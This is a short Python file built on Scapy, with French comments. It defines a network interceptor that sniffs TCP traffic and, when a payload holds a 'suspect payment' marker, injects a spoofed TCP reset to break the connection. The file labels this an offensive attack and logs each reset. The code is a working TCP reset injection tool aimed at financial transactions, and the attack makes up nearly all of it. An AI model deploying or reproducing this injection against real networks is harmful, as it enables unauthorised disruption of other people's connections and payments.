from scapy.all import *
from audit_blackbox.chain_sealer import ChainSealer

class NetworkInterceptor:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.sealer = ChainSealer()

    def sniffer(self, filter_rule):
        """Analyse passive du trafic financier (Optical Tap)"""
        sniff(iface=self.interface, filter=filter_rule, prn=self.analyze_packet)

    def analyze_packet(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if b"PAYMENT_SIG_SUSPECT" in payload:
                # Déclenchement de l'attaque offensive
                self.inject_tcp_reset(pkt)

    def inject_tcp_reset(self, pkt):
        """Interruption brutale d'une transaction via TCP Reset"""
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt[TCP].ack, ack=pkt[TCP].seq, flags="R")
        send(ip/tcp, verbose=False)
        self.sealer.log_action("OFFENSIVE_TCP_RESET", {"target_ip": pkt[IP].src})
